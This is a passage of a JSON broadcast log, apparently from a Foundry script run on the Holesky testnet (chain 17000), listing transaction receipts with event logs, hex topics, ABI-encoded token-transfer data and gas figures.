          "transactionHash": "0xb7851fc78f4d86275422b8cdfea0ba50fbcb7822bfe870d6a1778de8341ccfea",
          "transactionIndex": "0xf",
          "logIndex": "0x41",
          "removed": false
        },
        {
          "address": "0xf7336fd84911203f1f01ab6803eccc984700f591",
          "topics": [
            "0xbe89fbc5edbebf243cf8cf7946ce755357087079003d51a4eb7c69e987bf0801",
            "0x0000000000000000000000000000000000000000000000000000000000000002",
            "0x000000000000000000000000e79206ea5f8ed1a5281a812d8864f5b3207c9441",
            "0x000000000000000000000000f7336fd84911203f1f01ab6803eccc984700f591"
          ],
          "data": "0x00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000004000000000000000000000000000000000000000000000000000000000000006000000000000000000000000000000000000000000000000000000000000000648a9d3fcf00000000000000000000000056dd51c27325f54b7d3d4c468a16560981380a43000000000000000000000000e88150c42cc6c0294dd20893bf5b1ec6edd24fc600000000000000000000000000000000000000000000000000000000000000c800000000000000000000000000000000000000000000000000000000",
          "blockHash": "0xb386115cf2c68d0d3e4a7cfa71fcad491202d6aa008660edb3a9dfadf0dbcbaf",
          "blockNumber": "0x2d5169",
          "blockTimestamp": "0x67646f34",
          "transactionHash": "0xb7851fc78f4d86275422b8cdfea0ba50fbcb7822bfe870d6a1778de8341ccfea",
          "transactionIndex": "0xf",
          "logIndex": "0x42",
          "removed": false
        },
        {
          "address": "0xf7336fd84911203f1f01ab6803eccc984700f591",
          "topics": [
            "0x4641df4a962071e12719d8c8c8e5ac7fc4d97b927346a3d7a335b1f7517e133c",
            "0xc5e7ef55bb41d68613bf89a9a55fee592967bb27b2cb0be9b69e85e2e79e1841"
          ],
          "data": "0x",
          "blockHash": "0xb386115cf2c68d0d3e4a7cfa71fcad491202d6aa008660edb3a9dfadf0dbcbaf",
          "blockNumber": "0x2d5169",
          "blockTimestamp": "0x67646f34",
          "transactionHash": "0xb7851fc78f4d86275422b8cdfea0ba50fbcb7822bfe870d6a1778de8341ccfea",
          "transactionIndex": "0xf",
          "logIndex": "0x43",
          "removed": false
        },
        {
          "address": "0xe79206ea5f8ed1a5281a812d8864f5b3207c9441",
          "topics": [
            "0x44b4f910eed5395f84d00285781e37020302f8ae9b632209b4c3eafe05bd2e87",
            "0x00000000000000000000000056dd51c27325f54b7d3d4c468a16560981380a43",
            "0x000000000000000000000000e88150c42cc6c0294dd20893bf5b1ec6edd24fc6"
          ],
          "data": "0x00000000000000000000000000000000000000000000000000000000000000c8",
          "blockHash": "0xb386115cf2c68d0d3e4a7cfa71fcad491202d6aa008660edb3a9dfadf0dbcbaf",
          "blockNumber": "0x2d5169",
          "blockTimestamp": "0x67646f34",
          "transactionHash": "0xb7851fc78f4d86275422b8cdfea0ba50fbcb7822bfe870d6a1778de8341ccfea",
          "transactionIndex": "0xf",
          "logIndex": "0x44",
          "removed": false
        },
        {
          "address": "0xf35110f68f441fd3bd7d354a2a5faa1d32b970a7",
          "topics": [
            "0xddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef",
            "0x0000000000000000000000000000000000000000000000000000000000000000",
            "0x000000000000000000000000e88150c42cc6c0294dd20893bf5b1ec6edd24fc6"
          ],
          "data": "0x00000000000000000000000000000000000000000000000000000000000000c8",
          "blockHash": "0xb386115cf2c68d0d3e4a7cfa71fcad491202d6aa008660edb3a9dfadf0dbcbaf",
          "blockNumber": "0x2d5169",
          "blockTimestamp": "0x67646f34",
          "transactionHash": "0xb7851fc78f4d86275422b8cdfea0ba50fbcb7822bfe870d6a1778de8341ccfea",
          "transactionIndex": "0xf",
          "logIndex": "0x45",
          "removed": false
        }
      ],
      "logsBloom": "0x04000000000010000000000000000000000000000000000000000000000000000000000000000000000000100000000000000000000000000010000000a00000140000000000000010008008000000000000000000000000000000100000000020820000020000401000000080500801000000400000000000008018004000000000000000200000000400000000000000000002000040000000000080004000020000000100000000000100000000000000000000000400000010000000000000001002000000400000080000000020000000000000000000002000000020002810000004000000000000000000000000000000028000020000000008200008",
      "type": "0x2",
      "transactionHash": "0xb7851fc78f4d86275422b8cdfea0ba50fbcb7822bfe870d6a1778de8341ccfea",
      "transactionIndex": "0xf",
      "blockHash": "0xb386115cf2c68d0d3e4a7cfa71fcad491202d6aa008660edb3a9dfadf0dbcbaf",
      "blockNumber": "0x2d5169",
      "gasUsed": "0x45f21",
      "effectiveGasPrice": "0xe4e1cc",
      "from": "0xe88150c42cc6c0294dd20893bf5b1ec6edd24fc6",
      "to": "0xf7336fd84911203f1f01ab6803eccc984700f591",
      "contractAddress": null
    },
    {
      "status": "0x1",
      "cumulativeGasUsed": "0x334fc9",
      "logs": [
        {
          "address": "0x56dd51c27325f54b7d3d4c468a16560981380a43",
          "topics": [
            "0x06b541ddaa720db2b10a4d0cdac39b8d360425fc073085fac19bc82614677987",
            "0x000000000000000000000000b5e2cbf20b34f64dc3b286e880812b630c50e106",
            "0x000000000000000000000000b5e2cbf20b34f64dc3b286e880812b630c50e106",
            "0x000000000000000000000000e88150c42cc6c0294dd20893bf5b1ec6edd24fc6"
          ],
          "data": "0x00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000060000000000000000000000000000000000000000000000000000000000000008000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000",
          "blockHash": "0xb386115cf2c68d0d3e4a7cfa71fcad491202d6aa008660edb3a9dfadf0dbcbaf",
          "blockNumber": "0x2d5169",
          "blockTimestamp": "0x67646f34",
          "transactionHash": "0x674f81039501103d16edf6f7c48703e6b27ae8e5c8dc730b17fc190767e527e4",
          "transactionIndex": "0x10",
          "logIndex": "0x46",
          "removed": false
        },
        {
          "address": "0x56dd51c27325f54b7d3d4c468a16560981380a43",
          "topics": [
            "0xddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef",
            "0x000000000000000000000000b5e2cbf20b34f64dc3b286e880812b630c50e106",
            "0x000000000000000000000000e88150c42cc6c0294dd20893bf5b1ec6edd24fc6"
          ],
          "data": "0x0000000000000000000000000000000000000000000000000000000000000000",
          "blockHash": "0xb386115cf2c68d0d3e4a7cfa71fcad491202d6aa008660edb3a9dfadf0dbcbaf",
          "blockNumber": "0x2d5169",
          "blockTimestamp": "0x67646f34",
          "transactionHash": "0x674f81039501103d16edf6f7c48703e6b27ae8e5c8dc730b17fc190767e527e4",
          "transactionIndex": "0x10",
          "logIndex": "0x47",
          "removed": false
        }
      ],
      "logsBloom": "0x00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000008000000000000000000000000000000000000000000800000000000000000000000000000000000400000000000000010000000000000000000000000000000000000000000000002000000000000000080000000000000000100000000000000000000000000000000000000000010000000000000001002000000000000080000000000000000000000000000002000000000000000000004000000000000000000000000000000020000020000000000000000",
      "type": "0x2",
      "transactionHash": "0x674f81039501103d16edf6f7c48703e6b27ae8e5c8dc730b17fc190767e527e4",
      "transactionIndex": "0x10",
      "blockHash": "0xb386115cf2c68d0d3e4a7cfa71fcad491202d6aa008660edb3a9dfadf0dbcbaf",
      "blockNumber": "0x2d5169",
      "gasUsed": "0xc307",
      "effectiveGasPrice": "0xe4e1cc",
      "from": "0xe88150c42cc6c0294dd20893bf5b1ec6edd24fc6",
      "to": "0xb5e2cbf20b34f64dc3b286e880812b630c50e106",
      "contractAddress": null
    },
    {
      "status": "0x1",
      "cumulativeGasUsed": "0x76e316",
      "logs": [
        {
          "address": "0xe79206ea5f8ed1a5281a812d8864f5b3207c9441",
          "topics": [
            "0x44b4f910eed5395f84d00285781e37020302f8ae9b632209b4c3eafe05bd2e87",
            "0x000000000000000000000000f35110f68f441fd3bd7d354a2a5faa1d32b970a7",
            "0x000000000000000000000000e88150c42cc6c0294dd20893bf5b1ec6edd24fc6"
          ],
          "data": "0x000000000000000000000000000000000000000000000000000000000000012c",
          "blockHash": "0xb386115cf2c68d0d3e4a7cfa71fcad491202d6aa008660edb3a9dfadf0dbcbaf",
          "blockNumber": "0x2d5169",
          "blockTimestamp": "0x67646f34",
          "transactionHash": "0x58b2a15e12d222ee126307ea2bebe18329586f58aadfea010d9f1f8ec804799e",
          "transactionIndex": "0x12",
          "logIndex": "0x54",
          "removed": false
        },
        {
          "address": "0xf35110f68f441fd3bd7d354a2a5faa1d32b970a7",
          "topics": [
            "0xddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef",
            "0x000000000000000000000000e88150c42cc6c0294dd20893bf5b1ec6edd24fc6",
            "0x0000000000000000000000000000000000000000000000000000000000000000"
          ],
          "data": "0x000000000000000000000000000000000000000000000000000000000000012c",
          "blockHash": "0xb386115cf2c68d0d3e4a7cfa71fcad491202d6aa008660edb3a9dfadf0dbcbaf",
          "blockNumber": "0x2d5169",
          "blockTimestamp": "0x67646f34",
          "transactionHash": "0x58b2a15e12d222ee126307ea2bebe18329586f58aadfea010d9f1f8ec804799e",
          "transactionIndex": "0x12",
          "logIndex": "0x55",
          "removed": false
        },
        {
          "address": "0xe79206ea5f8ed1a5281a812d8864f5b3207c9441",
          "topics": [
            "0xbe89fbc5edbebf243cf8cf7946ce755357087079003d51a4eb7c69e987bf0801",
            "0x0000000000000000000000000000000000000000000000000000000000000001",
            "0x000000000000000000000000f7336fd84911203f1f01ab6803eccc984700f591",
            "0x000000000000000000000000e79206ea5f8ed1a5281a812d8864f5b3207c9441"
          ],
          "data": "0x00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001000000000000000000000000000000000000000000000000000000000000006000000000000000000000000000000000000000000000000000000000000000648a9d3fcf00000000000000000000000056dd51c27325f54b7d3d4c468a16560981380a43000000000000000000000000e88150c42cc6c0294dd20893bf5b1ec6edd24fc6000000000000000000000000000000000000000000000000000000000000012c00000000000000000000000000000000000000000000000000000000",
          "blockHash": "0xb386115cf2c68d0d3e4a7cfa71fcad491202d6aa008660edb3a9dfadf0dbcbaf",
          "blockNumber": "0x2d5169",
          "blockTimestamp": "0x67646f34",
          "transactionHash": "0x58b2a15e12d222ee126307ea2bebe18329586f58aadfea010d9f1f8ec804799e",
          "transactionIndex": "0x12",
          "logIndex": "0x56",
          "removed": false
        },
        {
          "address": "0xe79206ea5f8ed1a5281a812d8864f5b3207c9441",
          "topics": [
            "0x4641df4a962071e12719d8c8c8e5ac7fc4d97b927346a3d7a335b1f7517e133c",
            "0x18ab90d82b6688b39f0b14eccfc7ba2be5163359e02bc877d2b659c09e725f21"
          ],
          "data": "0x",
          "blockHash": "0xb386115cf2c68d0d3e4a7cfa71fcad491202d6aa008660edb3a9dfadf0dbcbaf",
          "blockNumber": "0x2d5169",
          "blockTimestamp": "0x67646f34",
          "transactionHash": "0x58b2a15e12d222ee126307ea2bebe18329586f58aadfea010d9f1f8ec804799e",
          "transactionIndex": "0x12",
          "logIndex": "0x57",
          "removed": false
        },
        {
          "address": "0xf7336fd84911203f1f01ab6803eccc984700f591",
          "topics": [
            "0x44b4f910eed5395f84d00285781e37020302f8ae9b632209b4c3eafe05bd2e87",
            "0x00000000000000000000000056dd51c27325f54b7d3d4c468a16560981380a43",
            "0x000000000000000000000000e88150c42cc6c0294dd20893bf5b1ec6edd24fc6"
          ],
          "data": "0x000000000000000000000000000000000000000000000000000000000000012c",
          "blockHash": "0xb386115cf2c68d0d3e4a7cfa71fcad491202d6aa008660edb3a9dfadf0dbcbaf",
          "blockNumber": "0x2d5169",
          "blockTimestamp": "0x67646f34",
          "transactionHash": "0x58b2a15e12d222ee126307ea2bebe18329586f58aadfea010d9f1f8ec804799e",
          "transactionIndex": "0x12",
          "logIndex": "0x58",
          "removed": false
        },
        {
          "address": "0x56dd51c27325f54b7d3d4c468a16560981380a43",
          "topics": [
            "0x06b541ddaa720db2b10a4d0cdac39b8d360425fc073085fac19bc82614677987",
            "0x000000000000000000000000f7336fd84911203f1f01ab6803eccc984700f591",
            "0x000000000000000000000000f7336fd84911203f1f01ab6803eccc984700f591",
            "0x000000000000000000000000e88150c42cc6c0294dd20893bf5b1ec6edd24fc6"
          ],
          "data": "0x000000000000000000000000000000000000000000000000000000000000012c0000000000000000000000000000000000000000000000000000000000000060000000000000000000000000000000000000000000000000000000000000008000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000",
          "blockHash": "0xb386115cf2c68d0d3e4a7cfa71fcad491202d6aa008660edb3a9dfadf0dbcbaf",
          "blockNumber": "0x2d5169",
          "blockTimestamp": "0x67646f34",
          "transactionHash": "0x58b2a15e12d222ee126307ea2bebe18329586f58aadfea010d9f1f8ec804799e",
          "transactionIndex": "0x12",
          "logIndex": "0x59",
          "removed": false
        },
        {
          "address": "0x56dd51c27325f54b7d3d4c468a16560981380a43",
          "topics": [
            "0xddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef",
            "0x000000000000000000000000f7336fd84911203f1f01ab6803eccc984700f591",
            "0x000000000000000000000000e88150c42cc6c0294dd20893bf5b1ec6edd24fc6"
          ],
          "data": "0x000000000000000000000000000000000000000000000000000000000000012c",
          "blockHash": "0xb386115cf2c68d0d3e4a7cfa71fcad491202d6aa008660edb3a9dfadf0dbcbaf",
          "blockNumber": "0x2d5169",
          "blockTimestamp": "0x67646f34",
          "transactionHash": "0x58b2a15e12d222ee126307ea2bebe18329586f58aadfea010d9f1f8ec804799e",
          "transactionIndex": "0x12",
          "logIndex": "0x5a",
          "removed": false
        }
      ],
      "logsBloom": "0x00000000000010000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000010000000840000140000000000000010008008000000000000000000040000000000100000000000020000020000401000000080401821000000400000000000008018000000000000000000200000000400000000000000000002000000000000000080004000000000000100000000000000000000000000000000000000000010000000000000001102000000400000000000000020000000000000001000002000000060002800000004000000800000000000000000000004000000020000000008200008",
      "type": "0x2",
      "transactionHash": "0x58b2a15e12d222ee126307ea2bebe18329586f58aadfea010d9f1f8ec804799e",
      "transactionIndex": "0x12",
      "blockHash": "0xb386115cf2c68d0d3e4a7cfa71fcad491202d6aa008660edb3a9dfadf0dbcbaf",
      "blockNumber": "0x2d5169",
      "gasUsed": "0x2073b",
      "effectiveGasPrice": "0xe4e1cc",
      "from": "0xe88150c42cc6c0294dd20893bf5b1ec6edd24fc6",
      "to": "0xe79206ea5f8ed1a5281a812d8864f5b3207c9441",
      "contractAddress": null
    }
  ],
  "libraries": [],
  "pending": [],
  "returns": {},
  "timestamp": 1734635318,
  "chain": 17000,
  "commit": "58111ea"
}